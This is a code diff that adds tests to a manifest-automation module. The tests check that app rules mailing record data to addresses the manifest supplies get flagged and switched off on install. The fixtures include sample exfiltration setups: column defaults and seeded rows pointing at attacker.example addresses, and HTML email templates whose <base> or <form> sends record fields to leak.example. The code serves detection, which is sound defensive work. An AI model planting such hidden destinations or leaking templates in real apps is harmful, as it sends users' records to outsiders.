@@ -15,7 +15,7 @@ import { appAfterInstallRepo, automationsRepo, type Automation } from '@adminium
 import type { Manifest } from '@adminium/manifest';
 import { afterEach, describe, expect, it } from 'vitest';
 
-import { installAutomations, outboundSteps, plannedAfterInstallOfRules } from '../src/apps/manifest-automations.js';
+import { installAutomations, outboundSteps, plannedAfterInstallOfRules, sampleTablesOf } from '../src/apps/manifest-automations.js';
 import { loadSnapshotView } from '../src/data-io/snapshot-view.js';
 import { bareAddress } from '../src/installs/resolve.js';
 import { addOnHarness, ENGINES, type Harness } from './app-add-ons.helpers.js';
@@ -127,6 +127,103 @@ describe('the steps that send out with no address to fill in', () => {
     expect(one([step({ to: '{{record.phone}}', text: 'Your order is ready' })])).toEqual({});
   });
 
+  it('a mail to a column whose value the file chose counts: a default, a copy of one, a rule, seeded rows, a setting written in', () => {
+    const mailTo = (key: string, column: string, on: Doc = trigger) => ({ ...RULE(key, [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column }, class: 'service' } })]), trigger: on });
+    const onTake = { kind: 'record', event: 'created', table: 'takes' };
+    /** The kit with more columns on items and on takes, and what else the file says. */
+    const shaped = (rules: Doc[], items: Doc[], takes: Doc[] = [], more: Doc = {}) => {
+      const doc = kit(rules);
+      const tables = (doc['requiredSchema'] as Doc)['tables'] as Doc[];
+      for (const table of tables) {
+        if (table['ref'] === 'items') table['columns'] = [...(table['columns'] as Doc[]), ...items];
+        if (table['ref'] === 'takes') table['columns'] = [...(table['columns'] as Doc[]), ...takes];
+      }
+      return Object.fromEntries(outboundSteps({ ...doc, ...more } as unknown as Manifest));
+    };
+    const audit = (more: Doc = {}) => ({ ref: 'audit_email', type: 'text', maxLength: 200, nullable: true, ...more });
+    // A default of the file's own: the mail goes where the file says.
+    expect(shaped([mailTo('m', 'audit_email')], [audit({ default: 'audit@attacker.example' })])).toEqual({ m: ['x'] });
+    expect(shaped([mailTo('m', 'audit_email')], [audit({ rules: { default: { from: { table: 'items', column: 'name' } } } })])).toEqual({ m: ['x'] });
+    expect(shaped([mailTo('m', 'audit_email')], [audit({ rules: { stamp: { set: { byOrigin: { public: 'audit@attacker.example' } }, on: 'create' } } })])).toEqual({ m: ['x'] });
+    // A copy from the linked row: out when the column it copies is the file's, not when it is a person's.
+    const copied = (from: string) => [{ ref: 'to_email', type: 'text', maxLength: 200, nullable: true, rules: { copy: { via: 'item_id', from } } }];
+    expect(shaped([mailTo('m', 'to_email', onTake)], [audit({ default: 'audit@attacker.example' })], copied('audit_email'))).toEqual({ m: ['x'] });
+    expect(shaped([mailTo('m', 'to_email', onTake)], [audit()], copied('buyer_email'))).toEqual({});
+    // Rows the file brings with that column filled; a seed file nobody here can read.
+    expect(shaped([mailTo('m', 'buyer_email')], [], [], { seeds: [{ table: 'items', rows: [{ name: 'Bolt', buyer_email: 'drop@attacker.example' }] }] })).toEqual({ m: ['x'] });
+    expect(shaped([mailTo('m', 'buyer_email')], [], [], { seeds: [{ table: 'items', rows: [{ name: 'Bolt' }] }] })).toEqual({});
+    expect(shaped([mailTo('m', 'buyer_email')], [], [], { seeds: [{ table: 'items', file: 'seeds/items.json' }] })).toEqual({ m: ['x'] });
+    expect(shaped([mailTo('m', 'buyer_email')], [], [], { sampleData: { file: 'seeds/sample.json' } })).toEqual({ m: ['x'] });
+    // A value that is not words, written into the column a mail goes to: the step and the mail.
+    const write = RULE('w', [node('y', 'action', { action: { kind: 'record.update', values: { buyer_email: { setting: { table: 'items', column: 'name' } } } } })]);
+    expect(shaped([write, mailTo('m', 'buyer_email')], [])).toEqual({ w: ['y'], m: ['x'] });
+    // A default on a column nothing mails sends nothing.
+    expect(shaped([mailTo('m', 'buyer_email')], [audit({ default: 'audit@attacker.example' })])).toEqual({});
+  });
+
+  it('sample rows count only for the tables the sample files fill, when those files were read', () => {
+    const mailTo = (key: string, column: string, on: Doc) => ({ ...RULE(key, [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column }, class: 'service' } })]), trigger: on });
+    const doc = kit([mailTo('items-mail', 'buyer_email', trigger), mailTo('takes-mail', 'note', { kind: 'record', event: 'created', table: 'takes' })]);
+    const found = (sampleTables?: ReadonlySet<string>) => Object.fromEntries(outboundSteps({ ...doc, sampleData: { file: 'seeds/sample.json' } } as unknown as Manifest, sampleTables));
+    // The file fills takes only: the mail to an items column goes to the person's own address.
+    expect(found(new Set(['takes']))).toEqual({ 'takes-mail': ['x'] });
+    expect(found(new Set())).toEqual({});
+    // Its files not read: every table counts.
+    expect(found()).toEqual({ 'items-mail': ['x'], 'takes-mail': ['x'] });
+  });
+
+  it('reads the tables a sample file and its rows for add-ons fill; one it cannot read counts every table', async () => {
+    const bundle = (refs: string[]) => Buffer.from(JSON.stringify({ format: 'adminium.sample/1', app: 'stock-kit', tables: refs.map((ref) => ({ ref, rows: [{ '@label': 'a' }] })) }));
+    const files: Record<string, Uint8Array> = { 'seeds/sample.json': bundle(['takes']), 'seeds/for-sms.json': bundle(['texts', 'items']), 'seeds/broken.json': Buffer.from('not json') };
+    const read = async (path: string): Promise<Uint8Array> => {
+      const bytes = files[path];
+      if (bytes === undefined) throw new Error(`no ${path}`);
+      return bytes;
+    };
+    const tablesOf = (sampleData: Doc | undefined) => sampleTablesOf({ ...kit(), ...(sampleData === undefined ? {} : { sampleData }) } as unknown as Manifest, read);
+    expect(await tablesOf(undefined)).toEqual(new Set());
+    expect(await tablesOf({ file: 'seeds/sample.json' })).toEqual(new Set(['takes']));
+    expect(await tablesOf({ file: 'seeds/sample.json', addOns: { sms: { file: 'seeds/for-sms.json' } } })).toEqual(new Set(['takes', 'texts', 'items']));
+    expect(await tablesOf({ file: 'seeds/broken.json' })).toBeUndefined();
+    expect(await tablesOf({ file: 'seeds/missing.json' })).toBeUndefined();
+  });
+
+  it('a template with a <base>, or a form sent to an outside host with the record in it, counts', () => {
+    const mail = RULE('m', [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-html', to: { kind: 'field', column: 'buyer_email' } } })]);
+    const one = (code: string) => Object.fromEntries(outboundSteps({ ...kit([mail]), emailTemplates: [mailTemplate('stock-kit-html', [{ block: 'email.html', data: { code } }])] } as unknown as Manifest));
+    expect(one('<base href="https://leak.example/"><img src="p/{{record.name}}">')).toEqual({ m: ['x'] });
+    expect(one('<form action="https://leak.example/f"><input type="hidden" value="{{record.name}}"><button>Go</button></form>')).toEqual({ m: ['x'] });
+    expect(one('<p>{{record.name}}</p><a href="https://docs.example/stock">Read how</a>')).toEqual({});
+  });
+
+  it('an add-on step given a person of the record (sales-crm 0.2.4) sends nothing of the file\'s own', () => {
+    // As released: the fit-out survey to the job's contact, two days after it is signed off.
+    const survey: Doc = {
+      key: 'survey-after-sign-off',
+      name: { 'en-US': 'A job is signed off: the fit-out survey 2 days later' },
+      enabled: false,
+      module: 'surveys',
+      trigger: { kind: 'record', event: 'updated', table: 'jobs', changedColumn: 'state', when: [{ left: { field: 'state' }, op: 'is', right: 'signed-off' }] },
+      graph: {
+        version: 1,
+        nodes: [
+          { id: 't', kind: 'trigger', title: 'A job is signed off' },
+          { id: 'wait', kind: 'wait', title: 'Wait 2 days', amount: 2, unit: 'days' },
+          { id: 'still', kind: 'condition', title: 'Still signed off', condition: { left: { field: 'state' }, op: 'is', right: 'signed-off' } },
+          { id: 'send', kind: 'action', title: "Send the fit-out survey to the job's contact", action: { kind: 'add-on.step', addOn: 'forms', step: 'send-survey', inputs: { survey: 'fit-out', to: '@link:contact_id', class: 'marketing' } } },
+        ],
+      },
+    };
+    expect(Object.fromEntries(outboundSteps({ ...kit([]), automations: [survey] } as unknown as Manifest))).toEqual({});
+    const self: Doc = structuredClone(survey);
+    self['graph']['nodes'][3]['action']['inputs']['to'] = '@record';
+    expect(Object.fromEntries(outboundSteps({ ...kit([]), automations: [self] } as unknown as Manifest))).toEqual({});
+    // An address of the file's own in the same place still counts.
+    const typed: Doc = structuredClone(survey);
+    typed['graph']['nodes'][3]['action']['inputs']['to'] = 'drop@attacker.example';
+    expect(Object.fromEntries(outboundSteps({ ...kit([]), automations: [typed] } as unknown as Manifest))).toEqual({ 'survey-after-sign-off': ['send'] });
+  });
+
   it('are listed for the review before anything is made', () => {
     expect(plannedAfterInstallOfRules({ ...kit(), kind: 'app' } as unknown as Manifest).filter((item) => item.kind === 'outbound')).toEqual(FLAGGED);
   });
@@ -165,6 +262,17 @@ for (const [dialect, available] of ENGINES) {
       const items = await appAfterInstallRepo(h.meta).list((await onlyInstall(h.meta, 'stock-kit')).installId);
       expect(items.filter((item) => item.kind === 'outbound').map(({ kind, item, field }) => ({ kind, item, field }))).toEqual(expect.arrayContaining(FLAGGED));
       expect(items.filter((item) => item.kind === 'outbound')).toHaveLength(FLAGGED.length);
+    });
+
+    it('a mail to a column the file gave a default arrives switched off, with its item', async () => {
+      const doc = kit([...RULES, RULE('mail-audit', [node('a', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column: 'audit_email' }, class: 'service' } })])]);
+      const items = ((doc['requiredSchema'] as Doc)['tables'] as Doc[]).find((table) => table['ref'] === 'items')!;
+      items['columns'] = [...(items['columns'] as Doc[]), { ref: 'audit_email', type: 'text', maxLength: 200, nullable: true, default: 'audit@attacker.example' }];
+      h = await installed(doc);
+      expect((await byKey(h, 'mail-audit')).enabled).toBe(false);
+      expect((await byKey(h, 'mail-plain')).enabled).toBe(true);
+      const after = await appAfterInstallRepo(h.meta).list((await onlyInstall(h.meta, 'stock-kit')).installId);
+      expect(after.filter((item) => item.kind === 'outbound').map(({ item, field }) => `${item}.${field}`)).toContain('mail-audit.a');
     });
 
     it('an update that brings one switches an unchanged rule off again; one already shown stays as its owner left it', async () => {
